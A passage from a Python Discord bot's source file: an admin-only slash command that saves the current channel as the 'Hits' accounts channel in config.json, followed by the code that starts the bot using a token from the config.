    choice=[
        app_commands.Choice(name="Hits", value="accounts_channel"),
    ]
)
async def set_channel_command(interaction: discord.Interaction, choice: app_commands.Choice[str]):
    if not isAdmin(interaction):
        await noPermission(interaction)
        return

    with open("config.json", "r") as config_file:
        newConfig = json.load(config_file)

    match choice.value:
        case "accounts_channel":
            newConfig["discord"]["accounts_channel"] = int(interaction.channel_id)

    with open("config.json", "w") as config_file:
        json.dump(newConfig, config_file, indent=4)

    await interaction.response.send_message(
        view=notice(f"Successfully set the {choice.name} channel!", "Done", accent=SUCCESS),
        ephemeral=True
    )


# ==================== MAIN ====================
bot = DiscordBot()
bot.remove_command("help")
bot.setup_logging()
bot.run(
    config["tokens"]["bot_token"],
    log_handler=None
)
